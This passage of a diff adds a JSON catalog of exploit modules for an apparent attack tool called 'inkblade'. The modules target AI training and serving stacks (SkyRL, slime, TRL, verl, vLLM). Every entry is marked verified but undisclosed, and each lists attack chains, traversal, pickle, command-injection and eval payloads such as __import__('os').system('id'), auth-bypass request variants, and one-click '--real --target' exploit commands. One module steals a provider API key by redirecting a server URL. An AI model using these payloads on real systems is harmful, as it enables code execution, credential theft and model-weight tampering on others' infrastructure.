+   "exploit": "base_url/decider_url -> attacker server -> server sends API key / evaluation payload",
+   "preconditions": [
+    "OpenJev-SiliconLabAI service reachable",
+    "server env has provider key"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-base-url",
+     "kind": "json",
+     "request": "base_url -> attacker server",
+     "transform": {
+      "op": "body_merge",
+      "arg": {
+       "base_url": "http://127.0.0.1:9/inkblade"
+      }
+     }
+    },
+    {
+     "id": "v2-decider-url",
+     "kind": "json",
+     "request": "decider_url -> attacker server",
+     "transform": {
+      "op": "body_merge",
+      "arg": {
+       "decider_url": "http://127.0.0.1:9/inkblade"
+      }
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit siliconlab-credential-exfil --dry-run",
+    "real": "inkblade exploit siliconlab-credential-exfil --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "窃取与数据泄露"
+   }
+  },
+  {
+   "id": "skyrl-fetch-weights",
+   "component": "skyrl",
+   "module": "skyrl-fetch-weights-traversal",
+   "surface": "http",
+   "version": "a1e34db",
+   "affected": "a1e34db",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "SkyRL a1e34db /fetch_weights joins payload_files into cache_dir; the route exists only in the SkyRL training recipe with a reachable worker port.",
+   "default_exposed": false,
+   "exploit": "payload_files=../../... -> write outside cache_dir -> control next loaded weights",
+   "preconditions": [
+    "/fetch_weights reachable",
+    "shared cache dir writable"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-dotdot-depth-4",
+     "kind": "query",
+     "request": "GET /fetch_weights?payload_files=../../../../tmp/inkblade-probe",
+     "transform": {
+      "op": "query",
+      "arg": [
+       "payload_files",
+       "../../../../tmp/inkblade-probe"
+      ]
+     }
+    },
+    {
+     "id": "v2-absolute-path",
+     "kind": "query",
+     "request": "GET /fetch_weights?payload_files=/tmp/inkblade-probe",
+     "transform": {
+      "op": "query",
+      "arg": [
+       "payload_files",
+       "/tmp/inkblade-probe"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit skyrl-fetch-weights --dry-run",
+    "real": "inkblade exploit skyrl-fetch-weights --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "skyrl-tinker-api",
+   "component": "skyrl",
+   "module": "skyrl-tinker-hijack",
+   "surface": "params",
+   "version": "a1e34db",
+   "affected": "*",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "The Tinker FastAPI app has no auth dependency and defaults to 0.0.0.0:8000, but it is an optional SkyRL serving entrypoint that must be started explicitly.",
+   "default_exposed": false,
+   "exploit": "unauthenticated create/sample/delete model control plane -> checkpoint manipulation",
+   "preconditions": [
+    "Tinker API started",
+    "port 8000 reachable"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-rollout-direct",
+     "kind": "params",
+     "request": "直连 rollout 端点",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "mode",
+       "direct"
+      ]
+     }
+    },
+    {
+     "id": "v2-rollout-via-env",
+     "kind": "params",
+     "request": "环境变量重定向变体",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "mode",
+       "env-redirect"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit skyrl-tinker-api --dry-run",
+    "real": "inkblade exploit skyrl-tinker-api --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "skyrl-vllm-devmode",
+   "component": "skyrl",
+   "module": "skyrl-dev-pickle-rce",
+   "surface": "http",
+   "version": "a1e34db",
+   "affected": "*",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "SkyRL forces VLLM_SERVER_DEV_MODE=1 in skyrl_train/workers/vllm_server_actor.py:216; the /update_weights pickle route only exists in that training recipe.",
+   "default_exposed": false,
+   "exploit": "unauthenticated /update_weights -> pickle decode -> marker; dev endpoints exposed on 0.0.0.0",
+   "preconditions": [
+    "SkyRL training recipe deployed",
+    "vLLM worker port reachable"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "path",
+     "request": "POST /dev/load/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-pct-encode",
+     "kind": "encoding",
+     "request": "POST /dev/%6Coad",
+     "transform": {
+      "op": "pct_encode"
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit skyrl-vllm-devmode --dry-run",
+    "real": "inkblade exploit skyrl-vllm-devmode --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "slime-pull-weights",
+   "component": "slime",
+   "module": "slime-weight-pull-poison",
+   "surface": "http",
+   "version": "slime 05e3b01 / SGLang v0.5.15.post1",
+   "affected": "<=0.4.0",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "Patched SGLang /pull_weights requires the slime patch stack (SGLang v0.5.15.post1) and a shared PVC/NFS writable by the attacker.",
+   "default_exposed": false,
+   "exploit": "unauthenticated /pull_weights with source_dir/local_checkpoint_dir -> cross-tenant weight write/read",
+   "preconditions": [
+    "slime patch stack deployed",
+    "shared PVC/NFS writable by attacker",
+    "port reachable"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "path",
+     "request": "POST /pull_weights/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-disk-variant",
+     "kind": "params",
+     "request": "磁盘 delta 权重通道变体（update_from_disk）",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "channel",
+       "disk-delta"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit slime-pull-weights --dry-run",
+    "real": "inkblade exploit slime-pull-weights --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "slime-torch-load",
+   "component": "slime",
+   "module": "slime-weight-pull-poison",
+   "surface": "http",
+   "version": "05e3b01",
+   "affected": "<=0.4.0",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "slime 05e3b01 torch.load(weights_only=False) on a training checkpoint; local checkpoint path, no default service route.",
+   "default_exposed": false,
+   "exploit": "malicious .pt -> torch.load(weights_only=False) -> RCE",
+   "preconditions": [
+    "shared NFS/JuiceFS writable by attacker",
+    "victim loads debug/resume data"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "path",
+     "request": "POST /pull_weights/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-disk-variant",
+     "kind": "params",
+     "request": "磁盘 delta 权重通道变体（update_from_disk）",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "channel",
+       "disk-delta"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit slime-torch-load --dry-run",
+    "real": "inkblade exploit slime-torch-load --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "trl-vllm-serve-devmode",
+   "component": "trl",
+   "module": "trl-serve-dev-mode",
+   "surface": "http",
+   "version": "1.15.0",
+   "affected": "<1.11.0",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "trl vllm-serve mounts dev weight/cache routes only in dev mode (TRL 1.15.0); the default serving command does not register them.",
+   "default_exposed": false,
+   "exploit": "dev endpoints (weight/cache control) reachable without token",
+   "preconditions": [
+    "trl vllm-serve used",
+    "port reachable"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "path",
+     "request": "GET /health/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-header-empty-key",
+     "kind": "encoding",
+     "request": "GET /health + api-key 空",
+     "transform": {
+      "op": "header",
+      "arg": [
+       "Authorization",
+       "Bearer "
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit trl-vllm-serve-devmode --dry-run",
+    "real": "inkblade exploit trl-vllm-serve-devmode --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "verl-checkpoint-pickle",
+   "component": "verl",
+   "module": "verl-checkpoint-pickle",
+   "surface": "http",
+   "version": "76e837e",
+   "affected": "<=0.9.1",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "verl checkpoint-channel pickle loads inside the training worker; requires the checkpoint RPC channel of a running verl job.",
+   "default_exposed": false,
+   "exploit": "connect to checkpoint channel -> send pickle -> RCE",
+   "preconditions": [
+    "checkpoint engine binds a reachable tcp://ip:port",
+    "flat network"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-torch-load",
+     "kind": "params",
+     "request": "torch.load 通道变体",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "channel",
+       "torch-load"
+      ]
+     }
+    },
+    {
+     "id": "v2-pickle-loads",
+     "kind": "params",
+     "request": "pickle.loads 通道变体",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "channel",
+       "pickle-loads"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit verl-checkpoint-pickle --dry-run",
+    "real": "inkblade exploit verl-checkpoint-pickle --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "verl-hdfs-command-injection",
+   "component": "verl",
+   "module": "verl-hdfs-command-injection",
+   "surface": "params",
+   "version": "76e837e",
+   "affected": "<=0.9.1",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "verl 76e837e passes an HDFS path into os.system; requires the HDFS dataloader path and a reachable training job.",
+   "default_exposed": false,
+   "exploit": "path with ;/$(...) -> os.system -> marker command execution",
+   "preconditions": [
+    "HDFS checkpoint path attacker-influenced",
+    "training job runs"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-shell-meta",
+     "kind": "encoding",
+     "request": "路径含 ; 分隔注入变体",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "inject",
+       "semicolon"
+      ]
+     }
+    },
+    {
+     "id": "v2-backtick",
+     "kind": "encoding",
+     "request": "路径含 `cmd` 命令替换变体",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "inject",
+       "backtick"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit verl-hdfs-command-injection --dry-run",
+    "real": "inkblade exploit verl-hdfs-command-injection --real --target <url>",
+    "backup_required": true,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": true,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "verl-prime-code-exec",
+   "component": "verl",
+   "module": "verl-prime-code-exec",
+   "surface": "file",
+   "version": "76e837e",
+   "affected": "76e837e",
+   "deployment_requirement": "function-level",
+   "deployment_evidence": "verl 76e837e eval() of generated reward code runs on the training host through the reward-function configuration (local code path).",
+   "default_exposed": false,
+   "exploit": "generated code exec() -> marker on training host",
+   "preconditions": [
+    "training job uses prime_code reward",
+    "model output is untrusted"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-eval-expression",
+     "kind": "reward-code",
+     "request": "reward expr: __import__('os').system('id')",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "reward expr: __import__('os').system('id')"
+      ]
+     }
+    },
+    {
+     "id": "v2-exec-import",
+     "kind": "reward-code",
+     "request": "reward expr: exec(\"import os; os.system('id')\")",
+     "transform": {
+      "op": "param",
+      "arg": [
+       "payload",
+       "reward expr: exec(\"import os; os.system('id')\")"
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit verl-prime-code-exec --dry-run",
+    "real": "inkblade exploit verl-prime-code-exec --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "核心代码"
+   }
+  },
+  {
+   "id": "vllm-rl-dev-auth-bypass",
+   "component": "vllm",
+   "module": "vllm-plugin-auth-bypass",
+   "surface": "http",
+   "version": "v0.32.0",
+   "affected": "<=0.32.0",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "vLLM 0.32.0 RL dev routes are mounted only with VLLM_SERVER_DEV_MODE=1 (SkyRL/TRL recipes); --api-key guards only /v1,/v2,/inference,/cohere.",
+   "default_exposed": false,
+   "exploit": "POST /pause, /resume, /abort_requests, /update_weights, /weight_checker without Authorization -> 200; /v1/* -> 401",
+   "preconditions": [
+    "VLLM_SERVER_DEV_MODE=1 (SkyRL/TRL recipes)",
+    "vLLM --api-key configured",
+    "port reachable"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-http",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "path",
+     "request": "GET /plugins/list/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-path-dotseg",
+     "kind": "path",
+     "request": "GET /plugins/./list",
+     "transform": {
+      "op": "path_dotseg"
+     }
+    },
+    {
+     "id": "v3-method-alt",
+     "kind": "method",
+     "request": "POST /plugins/list（空体）",
+     "transform": {
+      "op": "method",
+      "arg": "POST"
+     }
+    },
+    {
+     "id": "v4-header-empty-key",
+     "kind": "encoding",
+     "request": "GET /plugins/list + Authorization: Bearer 空",
+     "transform": {
+      "op": "header",
+      "arg": [
+       "Authorization",
+       "Bearer "
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit vllm-rl-dev-auth-bypass --dry-run",
+    "real": "inkblade exploit vllm-rl-dev-auth-bypass --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  },
+  {
+   "id": "vllm-jev-plugin-auth-bypass",
+   "component": "vllm-jev",
+   "module": "vllm-plugin-auth-bypass",
+   "surface": "http",
+   "version": "v0.31.0 + vllm-jev 57226d4",
+   "affected": "<=0.32.0",
+   "deployment_requirement": "needs-config",
+   "deployment_evidence": "vllm_jev/endpoint.py:530 registers /plugins/vllm-jev/choice outside vLLM's GUARDED_PREFIX (/v1,/v2,/inference,/cohere); the vllm-jev plugin (57226d4) must be installed before the route exists.",
+   "default_exposed": false,
+   "exploit": "POST /plugins/vllm-jev/choice without Authorization -> 200; /v1/systemone -> 401",
+   "preconditions": [
+    "vLLM started with --api-key",
+    "vllm-jev endpoint plugin registered",
+    "service port reachable"
+   ],
+   "disclosure": {
+    "channel": "vendor security policy",
+    "status": "undisclosed"
+   },
+   "verification": {
+    "dynamic": true,
+    "method": "dynamic-function",
+    "reason": "",
+    "status": "verified"
+   },
+   "variants": [
+    {
+     "id": "v1-path-trailing",
+     "kind": "path",
+     "request": "GET /plugins/list/",
+     "transform": {
+      "op": "path_suffix",
+      "arg": "/"
+     }
+    },
+    {
+     "id": "v2-path-dotseg",
+     "kind": "path",
+     "request": "GET /plugins/./list",
+     "transform": {
+      "op": "path_dotseg"
+     }
+    },
+    {
+     "id": "v3-method-alt",
+     "kind": "method",
+     "request": "POST /plugins/list（空体）",
+     "transform": {
+      "op": "method",
+      "arg": "POST"
+     }
+    },
+    {
+     "id": "v4-header-empty-key",
+     "kind": "encoding",
+     "request": "GET /plugins/list + Authorization: Bearer 空",
+     "transform": {
+      "op": "header",
+      "arg": [
+       "Authorization",
+       "Bearer "
+      ]
+     }
+    }
+   ],
+   "one_click": {
+    "dry_run": "inkblade exploit vllm-jev-plugin-auth-bypass --dry-run",
+    "real": "inkblade exploit vllm-jev-plugin-auth-bypass --real --target <url>",
+    "backup_required": false,
+    "marker": "INKBLADE-<run>"
+   },
+   "module_metadata": {
+    "writes": false,
+    "min_level": "利用验证",
+    "series": "横向利用"
+   }
+  }
+ ]
+}
